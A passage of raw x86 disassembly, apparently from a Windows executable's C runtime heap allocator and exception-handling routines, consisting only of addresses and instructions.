  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
